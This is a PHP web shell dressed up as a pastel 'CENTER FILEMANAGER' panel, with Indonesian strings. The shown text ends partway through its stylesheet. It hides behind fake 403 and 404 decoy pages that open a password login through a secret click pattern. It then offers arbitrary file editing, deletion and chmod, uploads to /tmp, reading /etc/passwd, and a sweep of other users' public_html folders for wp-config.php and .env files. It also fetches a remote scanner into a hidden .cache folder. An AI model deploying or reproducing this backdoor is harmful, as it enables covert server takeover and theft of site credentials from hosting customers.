<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);

// === LOGIN SYSTEM ===
if (php_sapi_name() === 'cli') { die('No CLI access'); }
define('ADMIN_PASSWORD_HASH', '$2a$12$BBaLHa.cGOJZR9697oj3auaNFtGk04W6vbsr8mqV9cwprwoPZM4SW');

function show_forbidden_decoy() {
    if (!headers_sent()) header('HTTP/1.1 403 Forbidden');
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head><title>403 Forbidden</title></head>
    <body>
        <h1>Forbidden</h1>
        <p>You don't have permission to access this
        <a href="?stage=white" style="color:inherit;text-decoration:none;">resource</a>.
        </p>
        <hr>
        <address>Apache/2.4.41 (Ubuntu) Server at <?php echo htmlspecialchars($host); ?> Port 80</address>
    </body></html>
    <?php
    exit;
}

function show_white_decoy() {
    ?>
    <!DOCTYPE html>
    <html><head><title>404 Not Found</title>
    <style>body{margin:0;padding:0;background:#fff;height:100vh;cursor:default}</style>
    </head><body>
    <script>
    var c=0, last=0;
    document.body.addEventListener('click', function(e){
        if(e.clientX >= window.innerWidth - 150 && e.clientY >= window.innerHeight - 150) {
            var now = Date.now();
            if(now - last > 1000) c = 0;
            c++; last = now;
            if(c >= 5 && now - (last - 3000) <= 3000) { location = '?login=1'; }
        }
    });
    </script>
    </body></html>
    <?php
    exit;
}

function show_login_page() {
    $err = isset($_SESSION['login_error']) ? $_SESSION['login_error'] : '';
    ?>
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><title>🐱 Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Comic Sans MS', 'Trebuchet MS', sans-serif; }
        body {
            background: linear-gradient(135deg, #ffd1dc, #c4e0ff, #d4f0d4, #fff4c4);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .floating { position: fixed; font-size: 40px; opacity: 0.4; animation: float 6s ease-in-out infinite; pointer-events: none; }
        .f1 { top: 10%; left: 10%; animation-delay: 0s; }
        .f2 { top: 20%; right: 15%; animation-delay: 1s; }
        .f3 { bottom: 15%; left: 20%; animation-delay: 2s; }
        .f4 { bottom: 25%; right: 10%; animation-delay: 3s; }
        .f5 { top: 45%; left: 5%; animation-delay: 4s; }
        .f6 { top: 60%; right: 5%; animation-delay: 5s; }
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(-5deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
        }
        .login-container {
            width: 350px; padding: 40px 30px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(10px);
            border: 3px dashed #ff9ec7;
            border-radius: 25px;
            box-shadow: 0 15px 40px rgba(255, 158, 199, 0.4);
            position: relative; z-index: 10;
            animation: pop 0.6s ease;
        }
        @keyframes pop {
            0% { transform: scale(0.7); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .login-title {
            text-align: center; margin-bottom: 25px;
            font-size: 22px; color: #ff6b9d;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        .login-title .emoji { display: block; font-size: 50px; margin-bottom: 10px; animation: wiggle 2s ease-in-out infinite; }
        @keyframes wiggle {
            0%, 100% { transform: rotate(-10deg); }
            50% { transform: rotate(10deg); }
        }
        .form-group { margin-bottom: 18px; }
        label { display:block; margin-bottom:8px; color:#ff6b9d; font-weight: bold; font-size: 14px; }
        input[type="password"] {
            width: 100%; padding: 12px 15px;
            background: #fff; color: #333;
            border: 2px solid #ffd1dc;
            border-radius: 15px; font-size: 14px;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none; border-color: #ff9ec7;
            box-shadow: 0 0 0 4px rgba(255, 158, 199, 0.2);
        }
        input[type="submit"] {
            width: 100%; padding: 12px;
            background: linear-gradient(135deg, #ff9ec7, #ffb8d8);
            color: #fff; border: none;
            border-radius: 15px; cursor: pointer;
            font-weight: bold; font-size: 15px;
            transition: all 0.3s; box-shadow: 0 4px 15px rgba(255, 158, 199, 0.4);
        }
        input[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 158, 199, 0.6);
        }
        .error {
            color: #ff4757; text-align: center; margin-bottom: 15px;
            padding: 10px; background: rgba(255, 71, 87, 0.1);
            border-radius: 10px; font-size: 13px;
        }
        .footer-note {
            text-align: center; margin-top: 20px;
            font-size: 12px; color: #999;
        }
    </style></head><body>
        <div class="floating f1">🌸</div>
        <div class="floating f2">⭐</div>
        <div class="floating f3">🎀</div>
        <div class="floating f4">✨</div>
        <div class="floating f5">🌈</div>
        <div class="floating f6">🍭</div>
        <div class="login-container">
            <div class="login-title">
                <span class="emoji">🐱</span>
                CENTER FILEMANAGER
                <br><small style="font-size: 12px; color:#999;">(◕‿◕✿)</small>
            </div>
            <?php if($err): ?>
                <div class="error">😿 <?php echo htmlspecialchars($err); ?></div>
                <?php unset($_SESSION['login_error']); ?>
            <?php endif; ?>
            <form method="POST" action="?login=1">
                <div class="form-group">
                    <label>🔑 Password:</label>
                    <input type="password" name="password" autofocus placeholder="Masukkan password...">
                </div>
                <input type="submit" value="✨ Login ✨">
            </form>
            <div class="footer-note">Made with 💖</div>
        </div>
    </body></html>
    <?php
    exit;
}

function handle_login() {
    if ((isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : '') === 'POST' && isset($_POST['password'])) {
        $password = $_POST['password'];
        if (function_exists('password_verify')) {
            $ok = password_verify($password, ADMIN_PASSWORD_HASH);
        } else {
            $ok = (crypt($password, ADMIN_PASSWORD_HASH) === ADMIN_PASSWORD_HASH);
        }
        if ($ok) {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_allowed'] = true;
            if (!headers_sent()) header('Location: ?');
            exit;
        } else {
            $_SESSION['login_error'] = 'Password salah!';
            if (!headers_sent()) header('Location: ?login=1');
            exit;
        }
    }
}

function handle_logout() {
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]);
    }
    session_destroy();
    if (!headers_sent()) header('Location: ?');
    exit;
}

if (isset($_GET['stage']) && $_GET['stage'] === 'white') {
    show_white_decoy();
}

if (isset($_GET['login']) || ((isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : '') === 'POST' && isset($_POST['password']))) {
    handle_login();
    show_login_page();
}

if (isset($_GET['logout'])) {
    handle_logout();
}

if (!isset($_SESSION['admin_allowed']) || $_SESSION['admin_allowed'] !== true) {
    show_forbidden_decoy();
}
// === END LOGIN SYSTEM ===

// === BAGIAN DIRECTORY (support PHP 5.2 - 8.x) ===
$defaultDir = defined('__DIR__') ? __DIR__ : dirname(__FILE__);

if (isset($_GET['dir']) && $_GET['dir'] !== '') {
    $directory = $_GET['dir'];
} elseif (!empty($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) {
    $directory = $_SERVER['DOCUMENT_ROOT'];
} else {
    $directory = $defaultDir;
}

$directory = str_replace('\\', '/', $directory);
$directory = preg_replace('#/+#', '/', $directory);
$directory = rtrim($directory, '/');
if ($directory === '') $directory = '/';

if (!@is_dir($directory)) {
    die("Direktori tidak valid.");
}

// === TOOLS DIRECTORY (.cache) ===
$toolsDir = $_SERVER['DOCUMENT_ROOT'] . '/.cache';
if (!@is_dir($toolsDir)) {
    @mkdir($toolsDir, 0755, true);
}

// === SCAN FILES ===
$files = @scandir($directory);
if ($files === false) $files = array();
$files = array_diff($files, array('.', '..', '.cache'));

$dirs = array();
$regularFiles = array();
foreach ($files as $file) {
    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
    if (@is_dir($filePath)) $dirs[] = $file;
    else $regularFiles[] = $file;
}
$sortedFiles = array_merge($dirs, $regularFiles);

// === SERVER INFO ===
$serverInfo = function_exists('php_uname') ? @php_uname() : 'Unknown';
$serverIP   = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : '-');
$phpVersion = function_exists('phpversion') ? @phpversion() : PHP_VERSION;
$currentDir = htmlspecialchars($directory, ENT_QUOTES);

$showTools  = isset($_GET['show_tools'])  ? true : false;
$showUpload = isset($_GET['show_upload']) ? true : false;
$showCmd    = isset($_GET['show_cmd'])    ? true : false;
$showFinder = isset($_GET['show_finder']) ? true : false;

// === SEARCH ===
function searchFile($dir, $filename) {
    $results = array();
    $items = @scandir($dir);
    if ($items === false) return $results;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (@is_dir($fullPath)) {
            if (stripos($item, $filename) !== false) $results[] = $fullPath;
            $results = array_merge($results, searchFile($fullPath, $filename));
        } elseif (stripos($item, $filename) !== false) {
            $results[] = $fullPath;
        }
    }
    return $results;
}

$searchResults = array();
if (isset($_GET['search']) && isset($_GET['dir'])) {
    $searchDir = $_GET['dir'];
    $searchName = $_GET['search'];
    if (@is_dir($searchDir)) {
        $searchResults = searchFile($searchDir, $searchName);
    } else {
        $searchResults[] = "Direktori tidak valid.";
    }
}

// === DOWNLOAD ADMINER ===
if (isset($_GET['download_adminer'])) {
    $adminerUrl = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    $destination = $toolsDir . "/adminer.php";
    $fileContents = @file_get_contents($adminerUrl);
    if ($fileContents) {
        @file_put_contents($destination, $fileContents);
        if (!headers_sent()) header('Location: ?dir=' . urlencode($directory) . '&adminer_downloaded=1');
    } else {
        if (!headers_sent()) header('Location: ?dir=' . urlencode($directory) . '&adminer_download_failed=1');
    }
    exit;
}

// === DOWNLOAD SCANNER ===
if (isset($_GET['download_scanner'])) {
    $scannerUrl = "https://raw.githubusercontent.com/Arya133/-23/refs/heads/main/scanner.php";
    $scannerDest = $toolsDir . "/scanner.php";
    $fc = @file_get_contents($scannerUrl);
    if ($fc) {
        @file_put_contents($scannerDest, $fc);
        if (!headers_sent()) header('Location: ?dir=' . urlencode($directory) . '&scanner_downloaded=1');
    } else {
        if (!headers_sent()) header('Location: ?dir=' . urlencode($directory) . '&scanner_failed=1');
    }
    exit;
}

// === UPLOAD KE /tmp/ ===
$tmpMsg = '';
if (isset($_POST['upload_tmp']) && isset($_FILES['tmp_files'])) {
    $tmpDir = '/tmp/';
    $tmpOk = 0;
    $tmpFail = 0;
    $tmpNames = array();

    foreach ($_FILES['tmp_files']['tmp_name'] as $i => $tmpName) {
        if ($_FILES['tmp_files']['error'][$i] === UPLOAD_ERR_OK) {
            $dest = $tmpDir . basename($_FILES['tmp_files']['name'][$i]);
            if (@move_uploaded_file($tmpName, $dest)) {
                $tmpOk++;
                $tmpNames[] = basename($_FILES['tmp_files']['name'][$i]);
            } else {
                $tmpFail++;
            }
        } else {
            $tmpFail++;
        }
    }

    $tmpMsg = '<span style="color:#52c77e">🎉 ' . $tmpOk . ' file terupload ke /tmp/';
    if ($tmpOk > 0) {
        $tmpMsg .= '<br><small style="color:#888">' . htmlspecialchars(implode(', ', array_slice($tmpNames, 0, 5))) . (count($tmpNames) > 5 ? '...' : '') . '</small>';
    }
    if ($tmpFail > 0) $tmpMsg .= '<br><span style="color:#ff6b9d">😿 ' . $tmpFail . ' gagal</span>';
    $tmpMsg .= '</span>';
}

// === READ /etc/passwd ===
$users = array();
if ($handle = @fopen("/etc/passwd", "r")) {
    while (($line = fgets($handle)) !== false) {
        $parts = explode(":", $line);
        if (isset($parts[0])) $users[] = $parts[0];
    }
    fclose($handle);
}

// === FIND CONFIG FILES ===
function findConfigFiles($baseDir) {
    $configFiles = array();
    $subDirs = @glob($baseDir . '/*', GLOB_ONLYDIR);
    if ($subDirs === false) return $configFiles;
    foreach ($subDirs as $subDir) {
        $filesToSearch = array('wp-config.php','configuration.php','.env','config.db.php','config.php');
        foreach ($filesToSearch as $file) {
            $filePath = $subDir . '/' . $file;
            if (@file_exists($filePath)) $configFiles[] = $filePath;
        }
    }
    return $configFiles;
}

$configFiles = array();
foreach ($users as $user) {
    $baseDir = "/home/$user/public_html";
    $configFiles = array_merge($configFiles, findConfigFiles($baseDir));
}

// === HANDLE POST ===
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $file = $directory . DIRECTORY_SEPARATOR . $_POST['file'];
        $action = $_POST['action'];

        if ($action === 'edit' && @file_exists($file) && isset($_POST['content'])) {
            @file_put_contents($file, $_POST['content']);
        }
        if ($action === 'rename' && @file_exists($file) && isset($_POST['new_name'])) {
            @rename($file, $directory . DIRECTORY_SEPARATOR . $_POST['new_name']);
        }
        if ($action === 'delete') {
            if (@file_exists($file)) {
                if (@is_dir($file)) deleteDirectory($file);
                else @unlink($file);
            }
        }
        if ($action === 'chmod' && @file_exists($file) && isset($_POST['permissions'])) {
            @chmod($file, octdec($_POST['permissions']));
        }
        if (!headers_sent()) header("Location: ?dir=" . urlencode($directory));
        exit;
    }
}

// === HAPUS FOLDER REKURSIF ===
function deleteDirectory($dir) {
    $files = @scandir($dir);
    if ($files === false) return;
    $files = array_diff($files, array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (@is_dir($filePath)) deleteDirectory($filePath);
        else @unlink($filePath);
    }
    @rmdir($dir);
}

// === SYSTEM INFO ===
function checkFunction($name) {
    if (!function_exists($name)) return 'not_exist';
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $list = array_map('trim', explode(',', $disabled));
        if (in_array($name, $list)) return 'disabled';
    }
    return 'on';
}

function checkBinary($bin) {
    if (!function_exists('shell_exec')) return 'unknown';
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $list = array_map('trim', explode(',', $disabled));
        if (in_array('shell_exec', $list)) return 'unknown';
    }
    $path = @shell_exec("which " . escapeshellarg($bin) . " 2>/dev/null");
    return $path ? 'on' : 'off';
}

function getSystemInfo() {
    $info = array();
    $funcs = array('shell_exec','exec','system','passthru','popen','proc_open','pcntl_exec','curl_exec','file_get_contents','fsockopen');
    foreach ($funcs as $f) $info['func_' . $f] = checkFunction($f);
    $bins = array('gcc','cc','g++','python','perl','curl','wget','nc','ncat','bash','sh');
    foreach ($bins as $b) $info['bin_' . $b] = checkBinary($b);
    $exts = array('curl','openssl','gd','mysqli','pdo','zip','mbstring','json','xml');
    foreach ($exts as $e) $info['ext_' . $e] = extension_loaded($e) ? 'on' : 'off';
    $info['php_version'] = function_exists('phpversion') ? @phpversion() : PHP_VERSION;
    $info['os']          = function_exists('php_uname') ? @php_uname() : 'Unknown';
    $info['user']        = function_exists('get_current_user') ? @get_current_user() : '-';
    $info['disable_functions'] = @ini_get('disable_functions');
    $info['open_basedir'] = @ini_get('open_basedir');
    $info['memory_limit'] = @ini_get('memory_limit');
    $info['max_upload']   = @ini_get('upload_max_filesize');
    $info['post_max']     = @ini_get('post_max_size');
    return $info;
}

function renderStatus($status) {
    if ($status === 'on')        return '<span style="color:#52c77e;font-weight:bold">✅ ON</span>';
    if ($status === 'off')       return '<span style="color:#ff6b9d;font-weight:bold">❌ OFF</span>';
    if ($status === 'disabled')  return '<span style="color:#ffb74d;font-weight:bold">🚫 DISABLED</span>';
    if ($status === 'not_exist') return '<span style="color:#aaa;font-weight:bold">➖ N/A</span>';
    return '<span style="color:#aaa">❓ UNKNOWN</span>';
}

$sysinfo = getSystemInfo();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌸 CENTER FILEMANAGER 🌸</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet">
<style>
:root {
    --pink: #ff9ec7;
    --pink-dark: #ff6b9d;
    --blue: #a8d8ff;
    --blue-dark: #6bb6ff;
    --green: #b8e6c4;
    --green-dark: #6bc98e;
    --yellow: #fff4b8;
    --purple: #d4b8ff;
    --bg: linear-gradient(135deg, #ffe6f0 0%, #e6f3ff 50%, #e6ffe6 100%);
    --card-bg: rgba(255, 255, 255, 0.85);
    --text: #4a4a4a;
    --text-light: #888;
}

* { margin:0; padding:0; box-sizing:border-box; font-family:'Fredoka', 'Comic Neue', 'Trebuchet MS', sans-serif; }

body {
    background: var(--bg);
    background-attachment: fixed;
    color: var(--text);
    padding: 20px;
    min-height: 100vh;
}

.floating-bg {
    position: fixed;
    font-size: 30px;
    opacity: 0.25;
    animation: floatbg 8s ease-in-out infinite;
    pointer-events: none;
    z-index: 0;
}
.fb1 { top: 5%; left: 3%; animation-delay: 0s; }
.fb2 { top: 15%; right: 5%; animation-delay: 1s; }
.fb3 { bottom: 10%; left: 8%; animation-delay: 2s; }
.fb4 { bottom: 20%; right: 3%; animation-delay: 3s; }
.fb5 { top: 40%; left: 2%; animation-delay: 4s; }
.fb6 { top: 60%; right: 2%; animation-delay: 5s; }
@keyframes floatbg {
    0%, 100% { transform: translateY(0) rotate(-10deg); }
    50% { transform: translateY(-25px) rotate(10deg); }
}

.container {
    background: var(--card-bg);
    backdrop-filter: blur(12px);
    border: 3px solid white;
    border-radius: 30px;
    max-width: 1400px;
    margin: 0 auto;
    overflow: hidden;
    box-shadow: 0 20px 60px rgba(255, 158, 199, 0.3);
    position: relative;
    z-index: 10;
}

.header {
    background: linear-gradient(135deg, #ffb8d8, #b8d8ff, #b8e6c4);
    background-size: 200% 200%;
    animation: gradientMove 8s ease infinite;
    padding: 25px;
    border-bottom: 3px dashed white;
}
@keyframes gradientMove {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
}
.header h1 {
    color: white;
    font-size: 28px;
    margin-bottom: 12px;
    text-shadow: 2px 2px 4px rgba(0,0,0,0.15);
    display: flex;
    align-items: center;
    gap: 10px;
}
.header h1 .emoji { font-size: 32px; animation: wiggle 2s ease-in-out infinite; display: inline-block; }
@keyframes wiggle {
    0%, 100% { transform: rotate(-10deg); }
    50% { transform: rotate(10deg); }
}
.system-info { display:flex; gap:12px; font-size:12px; color:#5a5a5a; flex-wrap:wrap; align-items:center; }
.system-info span {
    background: rgba(255,255,255,0.7);
    padding: 6px 12px;
    border-radius: 15px;
    font-weight: 600;
}
.system-info b { color: var(--pink-dark); }
.logout-btn {
    margin-left: auto;
    background: linear-gradient(135deg, #ff6b9d, #ff9ec7);
    color: white;
    padding: 8px 18px;
    text-decoration: none;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 600;
    box-shadow: 0 4px 12px rgba(255, 107, 157, 0.4);
    transition: all 0.3s;
}
.logout-btn:hover {
    transform: translateY(-2px) scale(1.05);
    box-shadow: 0 8px 20px rgba(255, 107, 157, 0.6);
}

.path-navigation {
    background: rgba(255, 255, 255, 0.6);
    padding: 15px 20px;
    border-bottom: 2px dashed #ffd1dc;
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 6px;
}
.path-navigation a {
    color: var(--blue-dark);
    text-decoration: none;
    padding: 6px 14px;
    background: white;
    border-radius: 15px;
    font-size: 13px;
    font-weight: 600;
    border: 2px solid var(--blue);
    transition: all 0.3s;
}
.path-navigation a:hover {
    background: var(--blue);
    color: white;
    transform: translateY(-2px);
}

.tools {
    padding: 15px 20px;
    background: rgba(255, 255, 255, 0.5);
    border-bottom: 2px dashed #ffe6f0;
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
}
.button {
    background: white;
    color: var(--text);
    border: 2px solid var(--pink);
    padding: 9px 18px;
    cursor: pointer;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 600;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    transition: all 0.3s;
    font-family: inherit;
}
.button:hover {
    background: var(--pink);
    color: white;
    transform: translateY(-2px) scale(1.05);
    box-shadow: 0 6px 15px rgba(255, 158, 199, 0.5);
}
.button-green { border-color: var(--green-dark); color: var(--green-dark); }
.button-green:hover { background: var(--green-dark); color: white; }
.button-red { border-color: var(--pink-dark); color: var(--pink-dark); }
.button-red:hover { background: var(--pink-dark); color: white; }

.message {
    padding: 15px;
    background: linear-gradient(90deg, rgba(184,230,196,0.4), rgba(168,216,255,0.4));
    border-bottom: 2px dashed #d4b8ff;
    text-align: center;
    font-weight: 600;
    font-size: 14px;
}

.file-list { list-style-type: none; padding: 20px; }
.file-item {
    background: white;
    border-radius: 20px;
    padding: 14px 20px;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    transition: all 0.3s;
    border: 2px solid transparent;
    box-shadow: 0 3px 10px rgba(255, 158, 199, 0.15);
}
.file-item:hover {
    transform: translateX(5px);
    border-color: var(--pink);
    box-shadow: 0 6px 20px rgba(255, 158, 199, 0.35);
}
.icon { font-size: 22px; margin-right: 15px; }
.folder-icon { color: #ffb74d; }
.file-icon { color: #b07cff; }
.file-name { flex: 1; margin-right: 5px; font-weight: 600; font-size: 14px; color: var(--text); }
.file-name a { color: var(--text); text-decoration: none; }
.file-name a:hover { color: var(--pink-dark); }
.file-item input[type="radio"] { margin-right: 12px; transform: scale(1.3); accent-color: var(--pink); }

.server-info {
    background: rgba(255,255,255,0.7);
    padding: 20px;
    border-radius: 20px;
    margin-bottom: 20px;
    border: 2px dashed #ffd1dc;
}
.server-info p { margin: 8px 0; font-size: 14px; }
.server-info .label-system,
.server-info .label-ip,
.server-info .label-php,
.server-info .label-dir { color: var(--pink-dark); font-weight: 600; }
.server-info .value-info { color: var(--text); }

.container-btn { display: flex; justify-content: center; align-items: center; }
.action-buttons {
    margin-top: 10px;
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    border: 3px dashed var(--pink);
    border-radius: 25px;
    padding: 18px;
    width: 90%;
    max-width: 500px;
    background: rgba(255, 255, 255, 0.7);
    box-shadow: 0 8px 25px rgba(255, 158, 199, 0.3);
    gap: 8px;
}
.action-button {
    font-size: 14px;
    color: white;
    padding: 10px 15px;
    margin: 0 3px;
    border-radius: 18px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s;
    text-align: center;
    background: linear-gradient(135deg, var(--pink), var(--pink-dark));
    text-decoration: none;
    border: none;
    font-family: inherit;
    min-width: 42px;
    box-shadow: 0 4px 10px rgba(255, 158, 199, 0.4);
}
.action-button:hover {
    transform: translateY(-3px) scale(1.1);
    box-shadow: 0 8px 20px rgba(255, 158, 199, 0.6);
}

.title {
    font-family: 'Fredoka', sans-serif;
    font-size: 38px;
    background: linear-gradient(135deg, var(--pink-dark), #b07cff, var(--blue-dark));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-align: center;
    margin-bottom: 25px;
    font-weight: 600;
    letter-spacing: 2px;
}

.success-notification, .error-notification {
    margin: 15px auto;
    padding: 15px 25px;
    border-radius: 20px;
    text-align: center;
    width: fit-content;
    font-weight: 600;
    animation: pop 0.5s ease;
}
@keyframes pop {
    0% { transform: scale(0.7); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
}
.success-notification {
    background: linear-gradient(135deg, #b8e6c4, #6bc98e);
    color: white;
    box-shadow: 0 6px 20px rgba(107, 201, 142, 0.4);
}
.error-notification {
    background: linear-gradient(135deg, #ffb8d8, #ff6b9d);
    color: white;
    box-shadow: 0 6px 20px rgba(255, 107, 157, 0.4);
}
.success-notification a, .error-notification a { color: white; text-decoration: underline; }

.terminal-container {
    background: rgba(255, 255, 255, 0.85);
    border-radius: 25px;
    padding: 25px;
    margin: 20px auto;
    max-width: 500px;
    border: 3px dashed var(--blue);
    box-shadow: 0 10px 30px rgba(168, 216, 255, 0.3);
}
.command-input {
    width: 100%;
    padding: 14px 18px;
    border: 2px solid var(--blue);
    border-radius: 20px;
    background: white;
    color: var(--text);
    font-family: 'Fredoka', monospace;
    font-size: 14px;
    margin-bottom: 10px;
}
.command-input:focus { outline: none; border-color: var(--blue-dark); box-shadow: 0 0 0 4px rgba(107, 182, 255, 0.2); }
.command-button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 20px;
    background: linear-gradient(135deg, var(--blue), var(--blue-dark));
    color: white;
    cursor: pointer;
    font-weight: 600;
    font-size: 15px;
    font-family: inherit;
    transition: all 0.3s;
    box-shadow: 0 4px 12px rgba(107, 182, 255, 0.4);
}
.command-button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(107, 182, 255, 0.6); }
.output {
    background: #fffaf5;
    color: #d97706;
    padding: 15px;
    margin-top: 15px;
    border-radius: 15px;
    white-space: pre-wrap;
    overflow-x: auto;
    font-size: 13px;
    max-height: 300px;
    overflow-y: auto;
    font-family: 'Courier New', monospace;
    border: 2px solid var(--yellow);
    width: 100%;
}

.tool-buttons {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 12px;
    margin: 20px 0;
}
.tool-button {
    display: flex;
    align-items: center;
    background: white;
    color: var(--text);
    padding: 12px 22px;
    border-radius: 20px;
    text-decoration: none;
    font-size: 14px;
    font-weight: 600;
    border: 2px solid var(--purple);
    box-shadow: 0 4px 12px rgba(212, 184, 255, 0.3);
    transition: all 0.3s;
}
.tool-button i { margin-right: 8px; font-size: 16px; color: var(--purple); }
.tool-button:hover {
    background: var(--purple);
    color: white;
    transform: translateY(-3px) scale(1.05);
    box-shadow: 0 8px 20px rgba(212, 184, 255, 0.6);
}
.tool-button:hover i { color: white; }

.config-grabber {
    margin-top: 20px;
    text-align: center;
    display: flex;
    flex-direction: column;
    align-items: center;
}
.config-grabber textarea {
    width: 60%;
    height: 200px;
    margin-bottom: 10px;
    background: white;
    color: var(--text);
    border: 2px solid var(--pink);
    border-radius: 15px;
    font-size: 13px;
    padding: 15px;
    font-family: 'Courier New', monospace;
    resize: none;
}
.config-grabber button {
    padding: 12px 25px;
    background: linear-gradient(135deg, var(--pink), var(--pink-dark));
    color: white;
    border: none;
    border-radius: 20px;
    cursor: pointer;
    font-weight: 600;
    font-family: inherit;
    box-shadow: 0 4px 12px rgba(255, 107, 157, 0.4);
    transition: all 0.3s;
}
.config-grabber button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255, 107, 157, 0.6); }

.form-container {
    background: rgba(255, 255, 255, 0.9);
    border-radius: 25px;
    padding: 30px;
    max-width: 400px;
    margin: 30px auto;
    box-shadow: 0 10px 30px rgba(255, 158, 199, 0.3);
    border: 3px dashed var(--pink);
}
.form-group { margin-bottom: 18px; }
.form-group label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    color: var(--pink-dark);
    margin-bottom: 8px;
}
.form-group input,
.form-group textarea {
    width: 100%;
    padding: 12px 15px;
    font-size: 14px;
    border-radius: 15px;
    border: 2px solid #ffd1dc;
    background: white;
    color: var(--text);
    font-family: inherit;
    transition: all 0.3s;
}
.form-group input:focus,
.form-group textarea:focus {
    border-color: var(--pink);
    outline: none;
    box-shadow: 0 0 0 4px rgba(255, 158, 199, 0.2);
}
.form-group textarea { height: 120px; resize: vertical; font-family: 'Courier New', monospace; }
.submit-button {
    display: block;
    width: 100%;
    background: linear-gradient(135deg, var(--pink), var(--pink-dark));
    color: white;
    padding: 14px;
    font-size: 15px;
    font-weight: 600;
    border-radius: 20px;
    border: none;
    cursor: pointer;
    font-family: inherit;
    transition: all 0.3s;
    box-shadow: 0 4px 12px rgba(255, 107, 157, 0.4);
}
.submit-button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255, 107, 157, 0.6); }

.search-results {
    background: rgba(255, 255, 255, 0.9);
    border-radius: 25px;
    padding: 25px;
    margin: 20px auto;
    max-width: 900px;
    border: 3px dashed var(--blue);
}
.search-results h3 { color: var(--blue-dark); font-size: 20px; margin-bottom: 15px; }
.search-results ul { list-style: none; padding: 0; }
.search-results li {
    background: rgba(255, 255, 255, 0.9);
    border-radius: 15px;
    margin-bottom: 10px;
    padding: 12px 18px;
    font-size: 13px;
    border-left: 4px solid var(--blue);
    word-break: break-all;
}
.search-results a { color: var(--blue-dark); text-decoration: none; font-weight: 600; }
.search-results a:hover { color: var(--pink-dark); }

.select-options {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 25px auto;
    max-width: 500px;
    gap: 10px;
    padding: 0 20px;
}
#actionSelect {
    flex: 2;
    padding: 12px 18px;
    font-size: 14px;
    border-radius: 20px;
    border: 2px solid var(--purple);
    background: white;
    color: var(--text);
    font-family: inherit;
    font-weight: 600;
    cursor: pointer;
}
.select-button {
    flex: 1;
    padding: 12px;
    border: none;
    border-radius: 20px;
    background: linear-gradient(135deg, var(--purple), #b07cff);
    color: white;
    font-weight: 600;
    font-family: inherit;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 4px 12px rgba(176, 124, 255, 0.4);
}
.select-button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(176, 124, 255, 0.6); }

.upload-container { margin: 20px auto; text-align: center; max-width: 500px; padding: 0 20px; }
.upload-container h3 { margin-bottom: 15px; font-size: 16px; }
.upload-container input[type="file"] {
    padding: 12px;
    background: white;
    color: var(--text);
    border: 2px dashed var(--green-dark);
